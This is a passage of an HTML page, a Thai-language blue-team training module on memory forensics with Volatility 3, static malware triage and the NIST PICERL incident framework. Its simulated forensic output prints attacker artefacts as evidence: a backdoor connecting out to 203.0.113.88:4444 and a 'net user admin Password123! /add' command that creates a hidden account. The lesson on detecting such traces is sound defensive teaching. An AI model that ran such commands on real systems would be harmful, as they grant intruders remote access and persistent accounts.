@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blue Team 2: Forensics & Incident Response - อบรม Cybersecurity & CTF Hands-on by Cyber Ratom</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=Fira+Code:wght@400;500;600&family=Kanit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-base: #050e0f;
+            --bg-surface: #0a1b1d;
+            --bg-card: #0f282b;
+            --bg-card-hover: #16373b;
+            --border: #1a4247;
+            --border-color: #1a4247;
+            --emerald: #10b981;
+            --teal: #14b8a6;
+            --cyan: #06b6d4;
+            --amber: #f59e0b;
+            --red: #ef4444;
+            --purple: #a855f7;
+            --accent-emerald: #34d399;
+            --accent-teal: #2dd4bf;
+            --text-main: #f8fafc;
+            --text-sub: #94a3b8;
+            --text-dim: #64748b;
+            --radius-sm: 6px;
+            --radius-md: 10px;
+            --radius-lg: 14px;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Kanit', sans-serif;
+            background-color: var(--bg-base);
+            color: var(--text-main);
+            line-height: 1.6;
+            background-image: 
+                radial-gradient(circle at 10% 10%, rgba(16, 185, 129, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 90% 90%, rgba(20, 184, 166, 0.08) 0%, transparent 40%),
+                linear-gradient(to bottom, rgba(10, 27, 29, 0.8) 0%, rgba(5, 14, 15, 0.98) 100%);
+            min-height: 100vh;
+        }
+
+        header {
+            background: rgba(10, 27, 29, 0.95);
+            border-bottom: 1px solid var(--border);
+            padding: 14px 24px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(12px);
+        }
+
+        .header-inner {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 14px;
+        }
+
+        .brand-group { display: flex; align-items: center; gap: 12px; }
+
+        .brand-logo {
+            background: linear-gradient(135deg, #059669, #0d9488);
+            width: 44px;
+            height: 44px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            box-shadow: 0 0 16px rgba(16, 185, 129, 0.5);
+        }
+
+        .brand-text h1 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, #34d399, #2dd4bf);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .brand-text p { font-size: 0.8rem; color: var(--text-sub); }
+
+        .header-controls { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+
+        .btn-link-pill {
+            padding: 6px 12px;
+            border-radius: 20px;
+            text-decoration: none;
+            font-size: 0.8rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            transition: all 0.2s;
+        }
+        .btn-blue { background: rgba(56, 189, 248, 0.15); border: 1px solid rgba(56, 189, 248, 0.4); color: #7dd3fc; }
+        .btn-red { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.4); color: #fca5a5; }
+        .btn-purple { background: rgba(168, 85, 247, 0.15); border: 1px solid rgba(168, 85, 247, 0.4); color: #d8b4fe; }
+
+        .btn-sound {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            color: var(--text-main);
+            padding: 6px 12px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.2s;
+        }
+        .btn-sound:hover { border-color: var(--emerald); }
+
+        .container { max-width: 1400px; margin: 0 auto; padding: 22px 20px 80px 20px; }
+
+        .nav-bar {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            padding: 4px 2px 18px 2px;
+            scrollbar-width: thin;
+        }
+
+        .tab-btn {
+            background: var(--bg-surface);
+            color: var(--text-sub);
+            border: 1px solid var(--border);
+            padding: 10px 16px;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            font-family: 'Kanit', sans-serif;
+            font-size: 0.9rem;
+            font-weight: 500;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s;
+        }
+        .tab-btn:hover { color: var(--text-main); background: var(--bg-card); border-color: var(--emerald); }
+        .tab-btn.active {
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.25), rgba(20, 184, 166, 0.2));
+            border-color: var(--emerald);
+            color: #fff;
+            box-shadow: 0 0 14px rgba(16, 185, 129, 0.4);
+        }
+
+        .module-view { display: none; animation: fadeIn 0.3s ease-in-out; }
+        .module-view.active { display: block; }
+
+        .hero-banner {
+            background: linear-gradient(135deg, #0a2124 0%, #0d292b 100%);
+            border: 1px solid #1a4f54;
+            border-radius: var(--radius-lg);
+            padding: 24px 28px;
+            margin-bottom: 24px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+        }
+        .hero-banner::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
+            background: linear-gradient(90deg, var(--emerald), var(--cyan));
+        }
+
+        .hero-title { font-size: 1.35rem; font-weight: 700; color: #f1f5f9; margin-bottom: 8px; display: flex; align-items: center; gap: 10px; }
+        .hero-text { color: var(--text-sub); font-size: 0.95rem; line-height: 1.6; }
+
+        .topic-card {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-md);
+            padding: 24px;
+            margin-bottom: 22px;
+            transition: border-color 0.2s;
+        }
+        .topic-card:hover { border-color: #24575c; }
+
+        .topic-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; flex-wrap: wrap; gap: 10px; }
+        .topic-title { font-size: 1.15rem; font-weight: 600; color: #e2e8f0; display: flex; align-items: center; gap: 8px; }
+        .topic-badge {
+            background: rgba(16, 185, 129, 0.15);
+            border: 1px solid rgba(16, 185, 129, 0.4);
+            color: #6ee7b7;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 0.76rem;
+            font-weight: 600;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .visual-model-card {
+            background: linear-gradient(135deg, #091a1c 0%, #0d2326 100%);
+            border: 1px solid #1c474c;
+            border-radius: var(--radius-md);
+            padding: 22px;
+            margin: 20px 0;
+            box-shadow: 0 6px 24px rgba(0,0,0,0.5);
+        }
+        .visual-model-title { font-size: 1.05rem; font-weight: 700; color: var(--emerald); margin-bottom: 12px; display: flex; align-items: center; gap: 10px; }
+
+        .controls-row {
+            display: flex; align-items: center; gap: 12px; flex-wrap: wrap; margin: 14px 0;
+            background: #061113; padding: 12px 16px; border-radius: 8px; border: 1px solid #16373b;
+        }
+
+        .btn-action {
+            background: linear-gradient(135deg, #059669, #0d9488); color: #fff; border: none;
+            padding: 8px 18px; border-radius: 6px; cursor: pointer; font-family: 'Kanit', sans-serif;
+            font-size: 0.88rem; font-weight: 600; transition: all 0.2s; display: flex; align-items: center; gap: 6px;
+        }
+        .btn-action:hover { transform: translateY(-1px); box-shadow: 0 0 12px rgba(16, 185, 129, 0.6); }
+
+        /* PICERL Step Grid */
+        .picerl-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px; margin: 14px 0;
+        }
+        .picerl-card {
+            background: #091719; border: 1px solid #1c3d40; border-radius: 8px; padding: 14px;
+            text-align: center; transition: all 0.3s; cursor: pointer;
+        }
+        .picerl-card:hover { border-color: var(--emerald); transform: translateY(-2px); }
+        .picerl-card.active { border-color: var(--emerald); background: rgba(16, 185, 129, 0.15); box-shadow: 0 0 12px rgba(16, 185, 129, 0.3); }
+
+        /* Volatility Console */
+        .vol-console {
+            background: #030809; border: 1px solid #143538; border-radius: 8px; padding: 14px;
+            font-family: 'Fira Code', monospace; font-size: 0.82rem; line-height: 1.7; color: #cbd5e1; margin: 10px 0; overflow-x: auto;
+        }
+
+        /* Quiz */
+        .quiz-container { background: var(--bg-surface); border: 1px solid var(--border); border-radius: var(--radius-md); padding: 24px; margin-top: 16px; }
+        .quiz-card { background: #081618; border: 1px solid #1a3c40; border-radius: 8px; padding: 18px; margin-bottom: 16px; }
+        .quiz-q { font-size: 0.98rem; font-weight: 600; color: #f1f5f9; margin-bottom: 12px; }
+        .quiz-opts { display: flex; flex-direction: column; gap: 8px; }
+        .quiz-opt {
+            background: #0f2427; border: 1px solid #1f474c; padding: 10px 14px; border-radius: 6px;
+            cursor: pointer; font-size: 0.88rem; color: #cbd5e1; transition: all 0.2s;
+        }
+        .quiz-opt:hover { border-color: var(--emerald); background: #17363b; }
+        .quiz-opt.correct { background: rgba(16, 185, 129, 0.2) !important; border-color: var(--emerald) !important; color: #6ee7b7 !important; font-weight: bold; }
+        .quiz-opt.wrong { background: rgba(239, 68, 68, 0.2) !important; border-color: var(--red) !important; color: #fca5a5 !important; }
+        .quiz-exp { margin-top: 10px; padding: 10px 14px; background: #040d0e; border-radius: 6px; font-size: 0.84rem; display: none; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-inner">
+            <div class="brand-group">
+                <div class="brand-logo">🧠</div>
+                <div class="brand-text">
+                    <h1>Blue Team 2: Forensics & Incident Response <span style="font-size:0.8rem;padding:3px 8px;border-radius:12px;background:rgba(16,185,129,0.2);color:#6ee7b7;border:1px solid #10b981;margin-left:6px;">DFIR SPECIALIST</span></h1>
+                    <p>อบรม Cybersecurity & CTF Hands-on by Cyber Ratom — การชันสูตรแรมด้วย Volatility, วิเคราะห์มัลแวร์เบื้องต้น, และกรอบรับมือภัยคุกคาม PICERL</p>
+                </div>
+            </div>
+            <div class="header-controls">
+                <a href="Blue_Team_Network_Log_Analysis.html" class="btn-link-pill btn-blue"><span>📡</span> Blue Team 1: Network ➔</a>
+                <a href="Blue_Team_Defense_Lab.html" class="btn-link-pill btn-red"><span>🛡️</span> Blue Defense WAF ➔</a>
+                <a href="Web_Exploitation_Fundamentals.html" class="btn-link-pill btn-purple"><span>⚔️</span> Red Team Lab ➔</a>
+                <button class="btn-sound" id="soundBtn" onclick="toggleAudio()">
+                    <span id="soundIcon">🔊</span> <span id="soundText">เสียง: เปิด</span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+
+        <!-- Navigation Tabs -->
+        <div class="nav-bar" id="navBar">
+            <button class="tab-btn active" onclick="switchTab(0)">💾 1. Memory Dump & Volatility 3</button>
+            <button class="tab-btn" onclick="switchTab(1)">🦠 2. Static Malware Analysis</button>
+            <button class="tab-btn" onclick="switchTab(2)">🚨 3. NIST PICERL Incident Framework</button>
+            <button class="tab-btn" onclick="switchTab(3)">🏆 4. DFIR & Forensics Exam (10 ข้อ)</button>
+        </div>
+
+        <!-- VIEW 0: Memory Dump & Volatility 3 -->
+        <section class="module-view active" id="view0">
+            <div class="hero-banner">
+                <div class="hero-title">💾 1. Memory Forensics & Volatility 3 — การชันสูตรแรมของเครื่องที่ถูกแฮก</div>
+                <div class="hero-text">
+                    มัลแวร์ยุคใหม่ (Fileless Malware) และโทรจันขโมยรหัสผ่าน มักทำงานอยู่ใน <strong>RAM (หน่วยความจำชั่วคราว)</strong> โดยไม่บันทึกลงฮาร์ดดิสก์!<br>
+                    <strong>กฎเหล็กอันดับ 1 ของ Forensics:</strong> <em>"ห้ามสั่ง Restart เครื่องเด็ดขาด!"</em> เพราะข้อมูลใน RAM ทั้งรหัสผ่าน, คำสั่งที่แฮกเกอร์พิมพ์, และ IP เชื่อมต่อจะหายไปทันที<br>
+                    เครื่องมือมาตรฐานสากลคือ <strong>Volatility 3 (vol.py)</strong>
+                </div>
+            </div>
+
+            <!-- Interactive Volatility Terminal Simulator -->
+            <div class="visual-model-card">
+                <div class="visual-model-title">
+                    <span>🔬</span> Interactive Volatility 3 Plugin Inspector
+                </div>
+                <p style="font-size:0.86rem; color:var(--text-sub); margin-bottom:12px;">
+                    คลิกเลือกปลั๊กอิน Volatility ด้านล่างเพื่อดูผลการแกะรอยโปรเซสมัลแวร์และแอดเดรสที่แฮกเกอร์เชื่อมต่อ
+                </p>
+
+                <div class="controls-row">
+                    <button class="btn-action" onclick="runVolSim('pslist')">1. windows.pslist (ดูโปรเซสทั้งหมด)</button>
+                    <button class="btn-action" onclick="runVolSim('pstree')">2. windows.pstree (ดูความสัมพันธ์แม่-ลูก)</button>
+                    <button class="btn-action" onclick="runVolSim('netscan')">3. windows.netscan (ดูการเชื่อมต่อ C2)</button>
+                    <button class="btn-action" onclick="runVolSim('cmdline')">4. windows.cmdline (ดูคำสั่งที่แฮกเกอร์พิมพ์)</button>
+                </div>
+
+                <div class="vol-console" id="volConsoleBox">
+                    <span style="color:#34d399;">$ python3 vol.py -f memory.dmp windows.pslist</span><br>
+                    PID &nbsp;&nbsp;&nbsp; PPID &nbsp;&nbsp; ImageFileName &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Offset(V) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Threads &nbsp; CreateTime<br>
+                    4 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xfa8001a12040 &nbsp;&nbsp;&nbsp;&nbsp; 92 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2026-09-05 01:00:00<br>
+                    392 &nbsp;&nbsp; 4 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; smss.exe &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xfa80023a1040 &nbsp;&nbsp;&nbsp;&nbsp; 2 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2026-09-05 01:00:02<br>
+                    512 &nbsp;&nbsp; 496 &nbsp;&nbsp;&nbsp; csrss.exe &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xfa80024f2b10 &nbsp;&nbsp;&nbsp;&nbsp; 9 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2026-09-05 01:00:05<br>
+                    <span style="color:#f87171; font-weight:bold;">4820 &nbsp; 2412 &nbsp;&nbsp; evil_backdoor.exe &nbsp;&nbsp; 0xfa80039bc080 &nbsp;&nbsp;&nbsp;&nbsp; 4 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2026-09-05 01:14:22 ⚠️ [SUSPICIOUS PROCESS]</span><br>
+                    4892 &nbsp; 4820 &nbsp;&nbsp; cmd.exe &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xfa8003a20120 &nbsp;&nbsp;&nbsp;&nbsp; 1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2026-09-05 01:14:25
+                </div>
+            </div>
+
+            <div class="topic-card">
+                <div class="topic-header">
+                    <div class="topic-title">📚 ปลั๊กอินหัวใจสำคัญของ Volatility 3</div>
+                    <span class="topic-badge">Plugin Reference</span>
+                </div>
+                <div class="topic-content">
+                    <ul style="margin-left: 20px; line-height: 1.8;">
+                        <li><code style="color:#34d399;">windows.pslist / windows.psscan</code>: แสดงรายชื่อ Process และค้นหา Process ที่แอบซ่อน (Hidden by Rootkit)</li>
+                        <li><code style="color:#34d399;">windows.netscan</code>: สแกนหา Socket TCP/UDP ดูว่าเครื่องกำลังเชื่อมต่อไปยัง C2 Server (IP / Port) ใด</li>
+                        <li><code style="color:#34d399;">windows.hashdump</code>: ดึง NTLM Password Hash ของทุก User บนเครื่องออกมาจาก RAM</li>
+                        <li><code style="color:#34d399;">windows.malfind</code>: ตรวจหา Injection Code ในหน่วยความจำ (หน้าความจำที่มีสิทธิ์ PAGE_EXECUTE_READWRITE)</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- VIEW 1: Static Malware Analysis -->
+        <section class="module-view" id="view1">
+            <div class="hero-banner">
+                <div class="hero-title">🦠 2. Static Malware Analysis — การวิเคราะห์มัลแวร์เบื้องต้นโดยไม่ต้องรันไฟล์</div>
+                <div class="hero-text">
+                    เมื่อพบไฟล์ต้องสงสัย <strong>ห้ามดับเบิ้ลคลิกรันเด็ดขาด!</strong><br>
+                    การวิเคราะห์เบื้องต้นเรียกว่า <strong>Static Analysis</strong> คือการตรวจสอบคุณลักษณะภายนอก: 
+                    ค่า Hash (SHA-256), สตริงคำสั่งลับ (strings), และรายการฟังก์ชันที่นำเข้า (Imported APIs)
+                </div>
+            </div>
+
+            <div class="topic-card">
+                <div class="topic-header">
+                    <div class="topic-title">🔬 4 สเต็ป Static Analysis ก่อนส่งต่อแล็บวิจัย</div>
+                    <span class="topic-badge">Triage Workflow</span>
+                </div>
+                <div class="topic-content">
+                    <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap:12px; margin-top:10px;">
+                        <div style="background:#061113; border:1px solid #1a3c40; padding:14px; border-radius:6px;">
+                            <div style="color:#34d399; font-weight:bold;">1. คำนวณค่า Hash & VirusTotal</div>
+                            <div style="font-size:0.8rem; color:#94a3b8; margin-top:4px;">รันคำสั่ง <code>sha256sum evil.exe</code> แล้วนำค่า Hash ไปค้นหาบน virustotal.com หากเคยตรวจพบจะทราบชื่อมัลแวร์ทันที</div>
+                        </div>
+                        <div style="background:#061113; border:1px solid #1a3c40; padding:14px; border-radius:6px;">
+                            <div style="color:#34d399; font-weight:bold;">2. ดึงสตริงด้วยคำสั่ง strings</div>
+                            <div style="font-size:0.8rem; color:#94a3b8; margin-top:4px;">รัน <code>strings -n 8 evil.exe</code> เพื่อส่องหา URL, IP แฮกเกอร์, ข้อความขู่กรรโชก (Ransomware note), หรือคีย์รีจิสทรี</div>
+                        </div>
+                        <div style="background:#061113; border:1px solid #1a3c40; padding:14px; border-radius:6px;">
+                            <div style="color:#34d399; font-weight:bold;">3. ตรวจสอบ Packer / Entropy</div>
+                            <div style="font-size:0.8rem; color:#94a3b8; margin-top:4px;">ใช้โปรแกรม <strong>Detect It Easy (DiE)</strong> เพื่อดูว่ามัลแวร์ถูกเข้ารหัสหรือบีบอัดด้วย UPX มาหรือไม่ เพื่อถอดออกก่อนวิเคราะห์</div>
+                        </div>
+                        <div style="background:#061113; border:1px solid #1a3c40; padding:14px; border-radius:6px;">
+                            <div style="color:#34d399; font-weight:bold;">4. ส่อง Imported Windows APIs</div>
+                            <div style="font-size:0.8rem; color:#94a3b8; margin-top:4px;">หากพบฟังก์ชันอย่าง <code>CreateRemoteThread</code>, <code>WriteProcessMemory</code> แสดงว่ามีพฤติกรรม Process Injection แน่นอน</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- VIEW 2: NIST PICERL Incident Framework -->
+        <section class="module-view" id="view2">
+            <div class="hero-banner">
+                <div class="hero-title">🚨 3. NIST SP 800-61 Rev. 2 — กรอบการรับมือภัยคุกคาม 6 ขั้นตอน (PICERL Framework)</div>
+                <div class="hero-text">
+                    เมื่อเกิดเหตุระบบโดนแฮก สิ่งสำคัญที่สุดคือ <strong>ความเป็นมืออาชีพและกระบวนการที่เป็นระบบ</strong><br>
+                    มาตรฐานสากลของ NIST และ SANS กำหนดกระบวนการรับมือเหตุฉุกเฉินออกเป็น 6 ระยะ: <strong>Preparation ➔ Identification ➔ Containment ➔ Eradication ➔ Recovery ➔ Lessons Learned</strong>
+                </div>
+            </div>
+
+            <!-- Interactive PICERL Visualizer -->
+            <div class="visual-model-card">
+                <div class="visual-model-title">
+                    <span>🔄</span> Interactive PICERL Lifecycle Explorer (คลิกแต่ละเฟสเพื่อดู Playbook)
+                </div>
+
+                <div class="picerl-grid">
+                    <div class="picerl-card active" onclick="showPicerl(0)">
+                        <div style="font-size:1.4rem;">📋</div>
+                        <div style="font-weight:bold; font-size:0.85rem; color:#34d399;">1. Preparation</div>
+                    </div>
+                    <div class="picerl-card" onclick="showPicerl(1)">
+                        <div style="font-size:1.4rem;">🔍</div>
+                        <div style="font-weight:bold; font-size:0.85rem; color:#38bdf8;">2. Identification</div>
+                    </div>
+                    <div class="picerl-card" onclick="showPicerl(2)">
+                        <div style="font-size:1.4rem;">🛑</div>
+                        <div style="font-weight:bold; font-size:0.85rem; color:#f59e0b;">3. Containment</div>
+                    </div>
+                    <div class="picerl-card" onclick="showPicerl(3)">
+                        <div style="font-size:1.4rem;">🧹</div>
+                        <div style="font-weight:bold; font-size:0.85rem; color:#ef4444;">4. Eradication</div>
+                    </div>
+                    <div class="picerl-card" onclick="showPicerl(4)">
+                        <div style="font-size:1.4rem;">🚀</div>
+                        <div style="font-weight:bold; font-size:0.85rem; color:#10b981;">5. Recovery</div>
+                    </div>
+                    <div class="picerl-card" onclick="showPicerl(5)">
+                        <div style="font-size:1.4rem;">📝</div>
+                        <div style="font-weight:bold; font-size:0.85rem; color:#a855f7;">6. Lessons Learned</div>
+                    </div>
+                </div>
+
+                <div id="picerlDetails" style="background:#030809; border:1px solid #16373b; border-radius:8px; padding:16px; margin-top:14px; font-size:0.9rem; line-height:1.7;">
+                    <!-- Filled by JS -->
+                </div>
+            </div>
+        </section>
+
+        <!-- VIEW 3: DFIR Exam (10 Questions) -->
+        <section class="module-view" id="view3">
+            <div class="hero-banner">
+                <div class="hero-title">🏆 4. Forensics & Incident Response Exam (10 ข้อสอบจำลองสถานการณ์)</div>
+                <div class="hero-text">
+                    แบบทดสอบวัดผลความรู้ด้าน Memory Forensics, Volatility, Malware Analysis และกระบวนการ PICERL<br>
+                    ตอบถูกครบ 10 ข้อเพื่อคว้าเกียรติบัตร DFIR Specialist!
+                </div>
+            </div>
+
+            <div class="quiz-container">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:16px;">
+                    <div style="font-size:1.1rem; font-weight:700; color:#34d399;">📝 ข้อสอบ Forensics & Incident Response (10 ข้อ)</div>
+                    <div id="dfirScoreDisplay" style="font-size:1rem; font-weight:700; color:#fbbf24; font-family:'Fira Code', monospace;">คะแนน: 0 / 10</div>
+                </div>
+
+                <div id="dfirQuizContainer"></div>
+            </div>
+        </section>
+
+    </div>
+
+    <script>
+        let audioCtx = null;
+        let audioEnabled = true;
+
+        function getAudioContext() {
+            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            if (audioCtx.state === 'suspended') audioCtx.resume();
+            return audioCtx;
+        }
+
+        function playTone(freq, type, duration, gainVal=0.08) {
+            if (!audioEnabled) return;
+            try {
+                const ctx = getAudioContext();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = type;
+                osc.frequency.setValueAtTime(freq, ctx.currentTime);
+                gain.gain.setValueAtTime(gainVal, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + duration);
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                osc.stop(ctx.currentTime + duration);
+            } catch(e) {}
+        }
+
+        function playClick() { playTone(920, 'sine', 0.07, 0.05); }
+        function playSuccess() { playTone(523.25, 'triangle', 0.12, 0.08); setTimeout(() => playTone(659.25, 'triangle', 0.15, 0.08), 80); }
+        function playWrong() { playTone(180, 'sawtooth', 0.25, 0.08); }
+
+        function toggleAudio() {
+            audioEnabled = !audioEnabled;
+            document.getElementById('soundIcon').innerText = audioEnabled ? '🔊' : '🔇';
+            document.getElementById('soundText').innerText = audioEnabled ? 'เสียง: เปิด' : 'เสียง: ปิด';
+            if (audioEnabled) playClick();
+        }
+
+        function switchTab(index) {
+            playClick();
+            const tabs = document.querySelectorAll('.tab-btn');
+            const views = document.querySelectorAll('.module-view');
+            tabs.forEach((t, i) => t.classList.toggle('active', i === index));
+            views.forEach((v, i) => v.classList.toggle('active', i === index));
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Volatility Simulation
+        function runVolSim(plugin) {
+            playClick();
+            const box = document.getElementById('volConsoleBox');
+            if (plugin === 'pslist') {
+                box.innerHTML = `
+<span style="color:#34d399;">$ python3 vol.py -f memory.dmp windows.pslist</span><br>
+PID &nbsp;&nbsp;&nbsp; PPID &nbsp;&nbsp; ImageFileName &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Offset(V) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Threads &nbsp; CreateTime<br>
+4 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xfa8001a12040 &nbsp;&nbsp;&nbsp;&nbsp; 92 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2026-09-05 01:00:00<br>
+<span style="color:#f87171; font-weight:bold;">4820 &nbsp; 2412 &nbsp;&nbsp; evil_backdoor.exe &nbsp;&nbsp; 0xfa80039bc080 &nbsp;&nbsp;&nbsp;&nbsp; 4 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2026-09-05 01:14:22 ⚠️ [SUSPICIOUS PROCESS]</span><br>
+4892 &nbsp; 4820 &nbsp;&nbsp; cmd.exe &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xfa8003a20120 &nbsp;&nbsp;&nbsp;&nbsp; 1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2026-09-05 01:14:25
+`;
+            } else if (plugin === 'pstree') {
+                box.innerHTML = `
+<span style="color:#34d399;">$ python3 vol.py -f memory.dmp windows.pstree</span><br>
+. 0xfa8002a15040 explorer.exe (PID: 2412)<br>
+.. 0xfa80039bc080 <span style="color:#f87171; font-weight:bold;">evil_backdoor.exe (PID: 4820) ⚠️ &lt;-- สืบทอดมาจาก Explorer</span><br>
+... 0xfa8003a20120 cmd.exe (PID: 4892) &lt;-- แฮกเกอร์เปิด Command Prompt<br>
+.... 0xfa8003b11040 whoami.exe (PID: 4950) &lt;-- แฮกเกอร์เช็คสิทธิ์ตนเอง
+`;
+            } else if (plugin === 'netscan') {
+                box.innerHTML = `
+<span style="color:#34d399;">$ python3 vol.py -f memory.dmp windows.netscan</span><br>
+Offset &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Proto &nbsp; LocalAddr &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LocalPort &nbsp; ForeignAddr &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ForeignPort &nbsp; State &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PID &nbsp;&nbsp; Owner<br>
+0xfa8003112000 &nbsp; TCP &nbsp;&nbsp;&nbsp; 192.168.1.45 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 49182 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#f87171; font-weight:bold;">203.0.113.88 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4444</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ESTABLISHED &nbsp; 4820 &nbsp; <span style="color:#f87171;">evil_backdoor.exe</span><br>
+<span style="color:#38ef7d; font-weight:bold;">[!] C2 REVERSE SHELL DETECTED: เครื่องกำลังส่งข้อมูลกลับไปยังแฮกเกอร์ IP 203.0.113.88:4444!</span>
+`;
+            } else if (plugin === 'cmdline') {
+                box.innerHTML = `
+<span style="color:#34d399;">$ python3 vol.py -f memory.dmp windows.cmdline</span><br>
+PID: 4820 (evil_backdoor.exe) ➔ "C:\\Users\\victim\\AppData\\Local\\Temp\\evil_backdoor.exe" --connect 203.0.113.88:4444<br>
+PID: 4892 (cmd.exe) ➔ "C:\\Windows\\system32\\cmd.exe" /c whoami & net user admin Password123! /add<br>
+<span style="color:#f87171; font-weight:bold;">[!] พบหลักฐานแฮกเกอร์พิมพ์คำสั่งแอบสร้าง User "admin" รหัสผ่าน "Password123!" บนเครื่อง!</span>
+`;
+            }
+        }
+
+        // PICERL Framework Details
+        const picerlData = [
+            {
+                title: "1. Preparation (การเตรียมความพร้อม)",
+                content: "• อัปเดต Playbook สำหรับกรณีโดนแฮก, ซ้อม Tabletop Exercise<br>• ติดตั้ง EDR / SIEM, กำหนดสิทธิ์ Least Privilege, และสำรองข้อมูล (Offline Backups 3-2-1)"
+            },
+            {
+                title: "2. Identification (การตรวจจับและยืนยันเหตุ)",
+                content: "• ตรวจสอบ Alert จาก SIEM / WAF ว่าเป็นภัยคุกคามจริง (True Positive) หรือไม่<br>• กำหนดขอบเขตความเสียหาย (Scope of Breach) และระบุเครื่องที่ได้รับผลกระทบ"
+            },
+            {
+                title: "3. Containment (การกักกันและจำกัดความเสียหาย)",
